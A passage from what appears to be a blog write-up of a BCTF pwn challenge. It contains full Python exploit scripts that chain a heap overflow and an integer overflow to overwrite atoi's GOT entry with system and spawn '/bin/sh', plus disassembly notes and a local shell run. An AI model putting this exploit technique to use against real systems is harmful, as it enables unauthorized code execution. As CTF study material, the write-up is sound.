+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span> <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># use this later to overwrite the ptr to the money DWORD</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b038</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">5</span><span class="p">))</span> <span class="c"># 0x804b038 = atoi@got</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># overflow</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># 0x8049b64 is a pointer to 0x0804932e</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8049b64</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># generate store menu &amp; overflow; 2nd item now points to 0x8049b64: 0x0804932e -&gt; sprintf function, used to overwrite ptr to money</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> 
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># get wholesale price, trigger function 0x0804932e</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span> 
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="c"># this value is used as an argument for 0x0804932e, conveniently translated for us by atoi!</span>
+</span><span class='line'>  <span class="c"># it is 0x804b280-51, so that the output of sprintf is aligned and will overwrite the money pointer with the address of atoi@got</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;134525517&#39;</span><span class="p">)</span> 
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># ok, now have control over ptr to money!</span>
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This allowed me to write to <code>atoi@got</code>! Or so I thought. The problem is that <code>atoi@got</code> contains <code>0xf74e2880</code>, which is atoi in libc. This number is interpreted by the program as a negative amount of money. When trying to modify the value at <code>atoi@got</code>, the value it contains is passed via this block of code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'> <span class="mi">8048</span><span class="n">f6b</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804b280</span> <span class="p">;</span> <span class="n">grab</span> <span class="n">location</span> <span class="n">of</span> <span class="n">money</span> <span class="n">DWORD</span> <span class="kn">from</span> <span class="nn">money</span> <span class="nn">pointer</span> <span class="p">(</span><span class="n">it</span> <span class="n">will</span> <span class="n">point</span> <span class="n">to</span> <span class="n">atoi</span><span class="nd">@got</span><span class="p">)</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">f71</span><span class="p">:</span> <span class="n">imul</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mh">0x74</span><span class="p">]</span>   <span class="p">;</span> <span class="n">eax</span> <span class="n">contains</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">item</span> <span class="n">to</span> <span class="n">buy</span><span class="p">,</span> <span class="n">multiply</span> <span class="n">it</span> <span class="n">by</span> <span class="n">price</span> <span class="n">of</span> <span class="n">item</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">f75</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">edx</span><span class="p">]</span>        <span class="p">;</span> <span class="n">grab</span> <span class="n">money</span> <span class="n">amount</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">f77</span><span class="p">:</span> <span class="n">sub</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">eax</span>                    <span class="p">;</span> <span class="n">subtract</span> <span class="n">cost</span> <span class="kn">from</span> <span class="nn">amount</span> <span class="nn">of</span> <span class="nn">money</span>
+</span><span class='line'> <span class="mi">8048</span><span class="n">f79</span><span class="p">:</span> <span class="n">js</span>     <span class="mi">8049008</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">+</span><span class="mh">0x838</span><span class="o">&gt;</span>   <span class="p">;</span> <span class="n">jump</span><span class="o">-</span><span class="k">if</span><span class="o">-</span><span class="n">sign</span><span class="p">:</span> <span class="k">if</span> <span class="n">the</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">leftover</span> <span class="n">money</span> <span class="ow">is</span> <span class="n">negative</span><span class="p">,</span> <span class="n">abort</span> <span class="n">the</span> <span class="n">transaction</span><span class="err">!</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since I needed to modify <code>atoi</code> (0xf74e2880) to <code>system</code> (0xf74f0c30), this <code>sub ecx,eax / js</code> block above would <em>never</em> let me modify the pointer in the global offset table to <code>system</code>. Looking back, the solution is easy, but I could not figure it out late at night.</p>
+
+<h2>Take one step back</h2>
+
+<p>After the CTF had ended, it dawned on me: I did not have to modify the got pointer of <code>atoi</code> completely, I could modify <em>part</em> of it! After all, if I move one byte back, the value I would be modifying would be <code>0x4f0c30xx</code>; this is still a positive number! Of course, it is possible that <code>atoi</code> is located at an address such as <code>0xf7dff880</code>; in this case, it still would not work.</p>
+
+<p>I updated the poc once more, to make the money object point to <code>atoi@got-1</code>. I needed to add 0x50dc3000-0x4ff88000 = 14921728 to atoi so that it points to system (at least, locally, on my box). This is done by buying item 2. It&rsquo;s price is set to <code>0x7fffffff</code>. Multiplying that by 14921728 gives an integer overflow to 0xff1c5000. The latter value will be subtracted from the value at atoi-1, conveniently updating the right portion of atoi!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
+</span><span class='line'>  <span class="c">#s.connect((&#39;146.148.60.107&#39;, 6666))</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># pause to allow gdb to attach</span>
+</span><span class='line'>  <span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># register store</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;store?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;S&quot;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span> <span class="c"># store name; maximum allowed, need it to overflow a buffer later!</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># the program *needs* to have an item to sell before it can generate a store menu</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># generate store menu. this will be 0xb20 bytes large, on the heap. </span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># second item</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xf</span><span class="p">)</span> <span class="c"># this will make the price of this item 0x7fffffff, ready to be abused later</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b038</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">5</span><span class="p">))</span> <span class="c"># 0x804b038 = atoi@got </span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># allocate the rest of the items</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">13</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>     <span class="c"># sell a phone</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mh">0x4f</span><span class="p">)</span> 
+</span><span class='line'>  
+</span><span class='line'>  <span class="c"># overflow</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x1f</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;OS?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;price?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-&#39;</span><span class="o">+</span><span class="s">&#39;9&#39;</span><span class="o">*</span><span class="mh">0xe</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x4f</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8049b64</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span> <span class="c"># generate store menu &amp; overflow into 2nd item</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span> <span class="c"># get wholesale price</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;134525517&#39;</span><span class="p">)</span> <span class="c"># is 0x804b280-51, so that the sprintf is aligned and will overwrite the money pointer with atoi@got or snprintf@got</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;14921728&#39;</span><span class="p">)</span>  <span class="c"># this is the offset of atoi to system on *my* box, 58288*256 (the *256 is to compensate for the crooked ptr)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;choice?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;buy?&#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh;&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c"># ok, should have a shell by now!</span>
+</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The binary is running locally via <code>socat</code>. Running the python script lands a shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/bctf/zhonguancun<span class="nv">$ </span>python ./zhong.py
+</span><span class='line'>
+</span><span class='line'> <span class="o">&lt;&lt;&lt;</span> Store Name: SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &gt;&gt;&gt;
+</span><span class='line'>...snip...
